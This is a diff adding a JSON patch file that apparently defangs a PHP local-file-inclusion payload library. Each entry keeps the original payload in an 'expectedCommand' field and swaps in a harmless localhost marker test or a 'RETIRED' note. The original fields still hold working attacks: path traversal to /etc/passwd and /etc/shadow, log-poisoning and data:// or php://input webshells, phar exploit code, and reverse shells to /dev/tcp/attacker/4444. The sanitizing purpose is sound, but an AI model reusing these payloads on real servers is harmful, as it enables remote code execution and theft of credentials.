@@ -1,0 +1,468 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "lfi-basic",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "?file=../../../etc/passwd\n?file=....//....//....//etc/passwd\n?file=..\\..\\..\\windows\\win.ini\n?page=php://filter/convert.base64-encode/resource=index.php",
+          "command": "BASE=\"http://127.0.0.1:8080\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?file=../payloader-fixture/PAYLOADER_MARKER.txt\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "../../../etc/passwd\n../../../etc/shadow\n../../../var/log/apache2/access.log\n../../../proc/self/environ\n../../../proc/self/cmdline",
+          "command": "../payloader-fixture/PAYLOADER_MARKER.txt\n./payloader-fixture/PAYLOADER_MARKER.txt\n/proc/self/cwd/payloader-fixture/PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "php://filter/convert.base64-encode/resource=config.php\nphp://input (POST数据作为输入)\nphp://data://text/plain,<?php phpinfo();?>\nphar://archive.zip/shell.php",
+          "command": "php://filter/convert.base64-encode/resource=./payloader-fixture/PAYLOADER_MARKER.php\ndata://text/plain,PAYLOADER_MARKER\nphar://./payloader-fixture/PAYLOADER_MARKER.phar/marker.txt\nzip://./payloader-fixture/PAYLOADER_MARKER.zip#marker.txt"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "1. 包含日志文件: ../../../var/log/apache2/access.log\n2. 在User-Agent中注入: <?php system($_GET['c']); ?>\n3. 访问: ?file=../../../var/log/apache2/access.log&c=id",
+          "command": "# RETIRED: executable log-poisoning workflow removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "....//....//....//etc/passwd\n..%252f..%252f..%252fetc/passwd\n..%c0%af..%c0%af..%c0%afetc/passwd\n....\\/....\\/....\\/etc/passwd",
+          "command": "../payloader-fixture/PAYLOADER_MARKER.txt\n..%2fpayloader-fixture%2fPAYLOADER_MARKER.txt\n..%252fpayloader-fixture%252fPAYLOADER_MARKER.txt\n....//payloader-fixture/PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "../../../etc/passwd%00\n../../../etc/passwd%00.jpg\n../../../etc/passwd/.jpg\nphp://filter/convert.base64-encode/resource=config.php%00",
+          "command": "# RETIRED: legacy null-byte and suffix tricks removed"
+        }
+      ]
+    },
+    {
+      "id": "lfi-log-poison",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# Apache日志\n../../../var/log/apache2/access.log\n../../../var/log/apache2/error.log\n../../../var/log/httpd/access_log\n../../../var/log/nginx/access.log\n\n# 系统日志\n../../../var/log/auth.log\n../../../var/log/syslog",
+          "command": "./payloader-fixture/logs/access.log\n../payloader-fixture/logs/access.log\n/proc/self/cwd/payloader-fixture/logs/access.log"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 使用curl投毒\ncurl -A \"<?php system($_GET['c']); ?>\" http://target.com/\n\n# 或使用Burp Suite修改User-Agent\nUser-Agent: <?php system($_GET['c']); ?>",
+          "command": "BASE=\"http://127.0.0.1:8080\"\ncurl --fail --silent --show-error --max-time 3 -A \"PAYLOADER_MARKER\" \"$BASE/\""
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 在URL路径中注入\ncurl http://target.com/<?php system($_GET['c']); ?>\n\n# URL编码\ncurl http://target.com/%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E",
+          "command": "BASE=\"http://127.0.0.1:8080\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?file=./payloader-fixture/logs/access.log\" | grep --fixed-strings \"PAYLOADER_MARKER\""
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 包含日志文件并执行命令\n?file=../../../var/log/apache2/access.log&c=id\n?file=../../../var/log/apache2/access.log&c=whoami\n?file=../../../var/log/apache2/access.log&c=cat /etc/passwd",
+          "command": "# RETIRED: log inclusion command execution removed"
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "?file=../../../var/log/apache2/access.log&c=bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"",
+          "command": "# RETIRED: reverse-shell log payload removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 使用Base64编码\n<?php eval(base64_decode($_GET['c'])); ?>\n# 然后传递Base64编码的命令",
+          "command": "# RETIRED: encoded eval payload removed"
+        }
+      ]
+    },
+    {
+      "id": "lfi-phar",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 创建恶意Phar\n<?php\nclass Exploit {\n    function __destruct() {\n        system($_GET['c']);\n    }\n}\n\n$phar = new Phar('exploit.phar');\n$phar->startBuffering();\n$phar->addFromString('test.txt', 'test');\n$phar->setStub('<?php __HALT_COMPILER(); ?>');\n$o = new Exploit();\n$phar->setMetadata($o);\n$phar->stopBuffering();\n?>",
+          "command": "WORK=$(mktemp -d)\ntrap 'rm -rf \"$WORK\"' EXIT\nphp -d phar.readonly=0 -r '$p=new Phar($argv[1]);$p->startBuffering();$p->addFromString(\"marker.txt\",\"PAYLOADER_MARKER\");$p->setStub(\"<?php __HALT_COMPILER();\");$p->stopBuffering();' \"$WORK/PAYLOADER_MARKER.phar\"\nphp -r '$p=new Phar($argv[1]);echo $p[\"marker.txt\"]->getContent(),PHP_EOL;' \"$WORK/PAYLOADER_MARKER.phar\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 通过file_exists触发\n?file=phar://exploit.phar&c=id\n\n# 通过file_get_contents触发\n?file=phar://exploit.phar/test.txt&c=id\n\n# 通过include触发\n?file=phar://exploit.phar&c=id",
+          "command": "?file=phar://./payloader-fixture/PAYLOADER_MARKER.phar/marker.txt"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 创建图片Phar\ncopy exploit.phar exploit.gif\n\n# 或添加GIF头\ncp exploit.phar exploit.gif\n\n# 触发\n?file=phar://uploads/exploit.gif&c=id",
+          "command": "php -r '$p=new Phar($argv[1]);foreach($p as $name=>$entry){echo $name,\" \",$entry->getSize(),PHP_EOL;}' \"./payloader-fixture/PAYLOADER_MARKER.phar\""
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# Laravel POP链\n# Symfony POP链\n# WordPress POP链\n# ThinkPHP POP链\n\n# 使用phpggc生成\ngit clone https://github.com/ambionics/phpggc\nphp phpggc Laravel/RCE1 system id > exploit.phar",
+          "command": "# RETIRED: PHAR metadata gadget workflow removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 将Phar内容Base64编码\n# 然后解码触发",
+          "command": "php -r 'echo hash_file(\"sha256\",$argv[1]),PHP_EOL;' \"./payloader-fixture/PAYLOADER_MARKER.phar\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "?file=php://filter/convert.base64-encode/resource=phar://exploit.phar\n# 组合使用",
+          "command": "php://filter/convert.base64-encode/resource=phar://./payloader-fixture/PAYLOADER_MARKER.phar/marker.txt"
+        }
+      ]
+    },
+    {
+      "id": "lfi-php-data",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 直接执行\n?file=data://text/plain,<?php system('id'); ?>\n\n# 执行phpinfo\n?file=data://text/plain,<?php phpinfo(); ?>\n\n# 输出文本\n?file=data://text/plain,Hello World",
+          "command": "?file=data://text/plain,PAYLOADER_MARKER"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# Base64编码执行\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\n# 解码后: <?php system('id'); ?>\n\n# 带参数执行\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id",
+          "command": "printf \"%s\" \"PAYLOADER_MARKER\" | base64\n?file=data://text/plain;base64,UEFZTE9BREVSX01BUktFUg=="
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 交互式命令\n?file=data://text/plain,<?php system($_GET['c']); ?>&c=id\n?file=data://text/plain,<?php system($_GET['c']); ?>&c=whoami\n?file=data://text/plain,<?php system($_GET['c']); ?>&c=cat /etc/passwd",
+          "command": "# RETIRED: data-wrapper command execution removed"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "?file=data://text/plain,<?php system(\"bash -c \\\"bash -i >& /dev/tcp/attacker/4444 0>&1\\\"\"); ?>\n\n# Base64版本\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjFcIiIpOyA/Pg==",
+          "command": "# RETIRED: data-wrapper reverse shell removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "?file=DATA://TEXT/PLAIN,<?php system('id'); ?>\n?file=Data://Text/Plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
+          "command": "# RETIRED: wrapper case pseudo-bypass removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e",
+          "command": "?file=data%3A%2F%2Ftext%2Fplain%2CPAYLOADER_MARKER"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "?file=data://text/html,<?php system('id'); ?>\n?file=data://application/x-httpd-php,<?php system('id'); ?>",
+          "command": "?file=data://text/plain,PAYLOADER_MARKER\n?file=data://text/csv,PAYLOADER_MARKER"
+        }
+      ]
+    },
+    {
+      "id": "lfi-php-filter",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# Base64编码读取\n?file=php://filter/convert.base64-encode/resource=index.php\n\n# Rot13读取\n?file=php://filter/read=string.rot13/resource=index.php\n\n# 字符转换\n?file=php://filter/read=string.toupper/resource=index.php",
+          "command": "?file=php://filter/convert.base64-encode/resource=./payloader-fixture/PAYLOADER_MARKER.php"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 多重编码\n?file=php://filter/convert.base64-encode|string.rot13/resource=config.php\n\n# 去除PHP标签\n?file=php://filter/read=string.strip_tags/resource=index.php",
+          "command": "php://filter/read=string.toupper/resource=./payloader-fixture/PAYLOADER_MARKER.txt\nphp://filter/read=string.rot13/resource=./payloader-fixture/PAYLOADER_MARKER.txt\nphp://filter/read=string.toupper|string.rot13/resource=./payloader-fixture/PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 使用iconv过滤器\n?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php\n\n# 使用zlib压缩\n?file=php://filter/zlib.deflate/resource=index.php\n?file=php://filter/zlib.inflate/resource=data",
+          "command": "php -r 'echo file_get_contents(\"php://filter/read=string.toupper/resource=./payloader-fixture/PAYLOADER_MARKER.txt\");'"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# WordPress配置\n?file=php://filter/convert.base64-encode/resource=wp-config.php\n\n# Laravel .env\n?file=php://filter/convert.base64-encode/resource=../.env\n\n# ThinkPHP配置\n?file=php://filter/convert.base64-encode/resource=application/database.php",
+          "command": "# RETIRED: real application configuration paths removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php\n?file=PhP://FiLtEr/convert.base64-encode/resource=config.php",
+          "command": "# RETIRED: wrapper case pseudo-bypass removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config.php",
+          "command": "?file=%70%68%70%3A%2F%2Ffilter/convert.base64-encode/resource=.%2Fpayloader-fixture%2FPAYLOADER_MARKER.php"
+        }
+      ]
+    },
+    {
+      "id": "lfi-php-input",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# GET请求\nGET ?file=php://input\n\n# POST数据\nPOST: <?php system('id'); ?>\nPOST: <?php echo 'Hello'; ?>",
+          "command": "curl --fail --silent --show-error --max-time 3   -H \"Content-Type: text/plain\"   --data-binary \"PAYLOADER_MARKER\"   \"http://127.0.0.1:8080/include?file=php://input\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 执行系统命令\nPOST: <?php system($_GET['c']); ?>\n# 然后访问: ?file=php://input&c=id\n\n# 使用exec\nPOST: <?php echo exec('id'); ?>\n\n# 使用shell_exec\nPOST: <?php echo shell_exec('id'); ?>",
+          "command": "POST /include?file=php://input HTTP/1.1\nHost: 127.0.0.1:8080\nContent-Type: text/plain\nContent-Length: 16\nConnection: close\n\nPAYLOADER_MARKER"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 读取文件\nPOST: <?php echo file_get_contents('/etc/passwd'); ?>\n\n# 写入文件\nPOST: <?php file_put_contents('shell.php', '<?php system($_GET[\"c\"]); ?>'); ?>\n\n# 列出目录\nPOST: <?php print_r(scandir('.')); ?>",
+          "command": "# RETIRED: request-body file read and write operations removed"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "POST: <?php system(\"bash -c \\\"bash -i >& /dev/tcp/attacker/4444 0>&1\\\"\"); ?>\n\n# 或使用\nPOST: <?php $sock=fsockopen(\"attacker\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
+          "command": "# RETIRED: request-body reverse shell removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# Base64编码\nPOST: <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?>\n# 解码后: system($_GET['c']);\n\n# Rot13编码\nPOST: <?php eval(str_rot13('flfgrz($_TRG['p']);')); ?>",
+          "command": "BODY=$(printf \"%s\" \"PAYLOADER_MARKER\" | base64)\ncurl --fail --silent --show-error --max-time 3   -H \"Content-Type: text/plain\"   --data-binary \"$BODY\"   \"http://127.0.0.1:8080/include?file=php://input\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "POST: <?=system($_GET['c']);?>\nPOST: <?=`$_GET[c]`?>",
+          "command": "# RETIRED: executable short-tag bodies removed"
+        }
+      ]
+    },
+    {
+      "id": "lfi-php-zip",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 创建shell.txt\necho '<?php system($_GET[\"c\"]); ?>' > shell.txt\n\n# 创建zip文件\nzip shell.zip shell.txt\n\n# 或使用Python\nimport zipfile\nwith zipfile.ZipFile('shell.zip', 'w') as z:\n    z.writestr('shell.txt', '<?php system($_GET[\"c\"]); ?>')",
+          "command": "WORK=$(mktemp -d)\ntrap 'rm -rf \"$WORK\"' EXIT\nprintf \"%s\" \"PAYLOADER_MARKER\" > \"$WORK/marker.txt\"\n(cd \"$WORK\" && zip -q PAYLOADER_MARKER.zip marker.txt)\nunzip -Z1 \"$WORK/PAYLOADER_MARKER.zip\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 通过文件上传功能上传shell.zip\n# 或通过其他方式上传\n\n# 记住上传路径\n/uploads/shell.zip",
+          "command": "curl --fail --silent --show-error --max-time 3   -F \"file=@./payloader-fixture/PAYLOADER_MARKER.zip;type=application/zip\"   \"http://127.0.0.1:8080/upload\""
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 使用zip://协议包含\n?file=zip://uploads/shell.zip%23shell.txt&c=id\n\n# %23是#的URL编码\n# 格式: zip://路径#文件名",
+          "command": "?file=zip://./payloader-fixture/PAYLOADER_MARKER.zip%23marker.txt"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 创建图片马\ncopy image.jpg+shell.zip image.jpg\n\n# 或使用\ncat image.jpg shell.zip > image.jpg\n\n# 包含\n?file=zip://uploads/image.jpg%23shell.txt&c=id",
+          "command": "# RETIRED: image-polyglot archive workflow removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "?file=phar://uploads/shell.zip/shell.txt&c=id\n# phar://也可以访问zip文件",
+          "command": "?file=phar://./payloader-fixture/PAYLOADER_MARKER.zip/marker.txt"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 在zip中嵌套zip\nzip inner.zip shell.txt\nzip outer.zip inner.zip\n\n# 包含\n?file=zip://outer.zip%23inner.zip%23shell.txt&c=id",
+          "command": "# RETIRED: unsupported nested zip wrapper syntax removed"
+        }
+      ]
+    },
+    {
+      "id": "lfi-proc",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 当前进程信息\n/proc/self/cmdline\n/proc/self/environ\n/proc/self/cwd\n/proc/self/exe\n/proc/self/fd/0\n/proc/self/fd/1\n/proc/self/fd/2",
+          "command": "/proc/self/cwd/payloader-fixture/PAYLOADER_MARKER.txt\n/proc/self/cwd/./payloader-fixture/PAYLOADER_MARKER.txt\n/proc/self/cwd/payloader-fixture/subdir/../PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "?file=../../../proc/self/environ\n\n# 在User-Agent中注入\nUser-Agent: <?php system($_GET['c']); ?>\n\n# 包含执行\n?file=../../../proc/self/environ&c=id",
+          "command": "BASE=\"http://127.0.0.1:8080\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?file=/proc/self/cwd/payloader-fixture/PAYLOADER_MARKER.txt\""
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# fd文件描述符\n/proc/self/fd/10\n/proc/self/fd/20\n\n# 尝试不同编号找到日志\n?file=../../../proc/self/fd/10",
+          "command": "# RETIRED: process file-descriptor enumeration removed"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 枚举进程\n/proc/[pid]/cmdline\n/proc/[pid]/environ\n/proc/[pid]/maps\n\n# 暴力枚举\n?file=../../../proc/1/cmdline\n?file=../../../proc/2/cmdline",
+          "command": "# RETIRED: other-process and environment enumeration removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "?file=/proc/self/environ\n?file=proc/self/environ",
+          "command": "?file=/proc/self/cwd/payloader-fixture/PAYLOADER_MARKER.txt\n?file=proc/self/cwd/payloader-fixture/PAYLOADER_MARKER.txt"
+        }
+      ]
+    },
+    {
+      "id": "lfi-session",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# Linux默认路径\n/var/lib/php/sessions/sess_[PHPSESSID]\n/var/lib/php5/sess_[PHPSESSID]\n/var/lib/php7/sess_[PHPSESSID]\n/tmp/sess_[PHPSESSID]\n/c:/windows/temp/sess_[PHPSESSID]",
+          "command": "./payloader-fixture/sessions/sess_PAYLOADERMARKER\n../payloader-fixture/sessions/sess_PAYLOADERMARKER\n/proc/self/cwd/payloader-fixture/sessions/sess_PAYLOADERMARKER"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 通过用户输入控制Session\n# 例如用户名、个人简介等\nusername: <?php system($_GET['c']); ?>\n\n# 或通过Cookie\nSet-Cookie: PHPSESSID=malicious",
+          "command": "WORK=$(mktemp -d)\ntrap 'rm -rf \"$WORK\"' EXIT\nphp -d session.save_path=\"$WORK\" -r 'session_id(\"PAYLOADERMARKER\");session_start();$_SESSION[\"marker\"]=\"PAYLOADER_MARKER\";session_write_close();'\ngrep --fixed-strings \"PAYLOADER_MARKER\" \"$WORK/sess_PAYLOADERMARKER\""
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 包含Session文件\n?file=/var/lib/php/sessions/sess_abc123&c=id\n\n# 或使用相对路径\n?file=../../../var/lib/php/sessions/sess_abc123&c=id",
+          "command": "?file=./payloader-fixture/sessions/sess_PAYLOADERMARKER"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 利用Session竞争\n# 1. 持续写入恶意代码到Session\n# 2. 同时包含Session文件\n# 3. 在Session被清理前执行",
+          "command": "# RETIRED: session-file race execution workflow removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 尝试预测Session ID\n# 常见模式: md5(ip.time.random)\n# 暴力枚举Session ID",
+          "command": "# RETIRED: session ID prediction and brute force removed"
+        }
+      ]
+    },
+    {
+      "id": "lfi-traversal",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "../../../etc/passwd\n../../../../etc/passwd\n../../../../../etc/passwd\n..\\..\\..\\windows\\win.ini",
+          "command": "?file=../payloader-fixture/PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "....//....//....//etc/passwd\n....//....//etc/passwd\n..././..././..././etc/passwd",
+          "command": "....//payloader-fixture/PAYLOADER_MARKER.txt\n..././payloader-fixture/PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "..%2f..%2f..%2fetc/passwd\n..%252f..%252f..%252fetc/passwd\n%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+          "command": "..%2fpayloader-fixture%2fPAYLOADER_MARKER.txt\n..%252fpayloader-fixture%252fPAYLOADER_MARKER.txt\n%2e%2e%2fpayloader-fixture%2fPAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "..%c0%af..%c0%af..%c0%afetc/passwd\n..%c1%9c..%c1%9c..%c1%9cwindows\\win.ini\n..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
+          "command": "# RETIRED: overlong and ambiguous Unicode traversal encodings removed"
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "/etc/passwd\n/etc/shadow\n/var/log/apache2/access.log\nC:/windows/win.ini\nC:\\windows\\system32\\config\\sam",
+          "command": "/proc/self/cwd/payloader-fixture/PAYLOADER_MARKER.txt\n%CD%\\payloader-fixture\\PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "..%2f..%c0%af..%2fetc/passwd\n%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+          "command": "..%2fpayloader-fixture%2fPAYLOADER_MARKER.txt\n%2e%2e/payloader-fixture/PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "../../../etc/passwd%00\n../../../etc/passwd%00.jpg\n../../../etc/passwd%00.html",
+          "command": "# RETIRED: legacy null-byte truncation variants removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "../../../windows/win.ini.\n../../../windows/win.ini...\n../../../boot.ini……",
+          "command": "..\\payloader-fixture\\PAYLOADER_MARKER.txt.\n..\\payloader-fixture\\PAYLOADER_MARKER.txt...\n..\\payloader-fixture\\PAYLOADER_MARKER.txt "
+        }
+      ]
+    },
+    {
+      "id": "lfi-wrapper",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 读取源码(Base64)\n?file=php://filter/convert.base64-encode/resource=config.php\n\n# 读取源码(Rot13)\n?file=php://filter/read=string.rot13/resource=config.php\n\n# 多重过滤器\n?file=php://filter/convert.base64-encode|string.rot13/resource=config.php",
+          "command": "php://filter/convert.base64-encode/resource=./payloader-fixture/PAYLOADER_MARKER.php\nphp://filter/read=string.rot13/resource=./payloader-fixture/PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# POST执行PHP代码\n?file=php://input\nPOST: <?php system('id'); ?>\n\n# 执行任意代码\nPOST: <?php phpinfo(); ?>\nPOST: <?php echo file_get_contents('/etc/passwd'); ?>",
+          "command": "php://input\nContent-Type: text/plain\nPAYLOADER_MARKER"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 直接执行代码\n?file=data://text/plain,<?php system('id'); ?>\n\n# Base64编码\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\n\n# 执行任意命令\n?file=data://text/plain,<?php system($_GET['c']); ?>&c=id",
+          "command": "data://text/plain,PAYLOADER_MARKER\ndata://text/plain;base64,UEFZTE9BREVSX01BUktFUg=="
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 创建phar文件\n<?php\n$p = new Phar('shell.phar');\n$p->addFromString('shell.txt', '<?php system($_GET[\"c\"]); ?>');\n?>\n\n# 包含phar\n?file=phar://shell.phar/shell.txt&c=id",
+          "command": "phar://./payloader-fixture/PAYLOADER_MARKER.phar/marker.txt"
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "# 创建zip文件\nzip shell.zip shell.txt\n# shell.txt内容: <?php system($_GET['c']); ?>\n\n# 包含zip\n?file=zip://shell.zip%23shell.txt&c=id\n\n# 使用jpg+zip\ncopy shell.jpg+shell.zip shell.jpg\n?file=zip://shell.jpg%23shell.txt&c=id",
+          "command": "zip://./payloader-fixture/PAYLOADER_MARKER.zip#marker.txt"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "?file=Php://filter/convert.base64-encode/resource=config.php\n?file=DATA://text/plain,<?php system('id'); ?>",
+          "command": "# RETIRED: wrapper case pseudo-bypasses removed"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php\n?file=%70%68%70%3a%2f%2finput",
+          "command": "php%3A%2F%2Ffilter/convert.base64-encode/resource=.%2Fpayloader-fixture%2FPAYLOADER_MARKER.php\n%70%68%70%3A%2F%2Finput"
+        }
+      ]
+    }
+  ]
+}
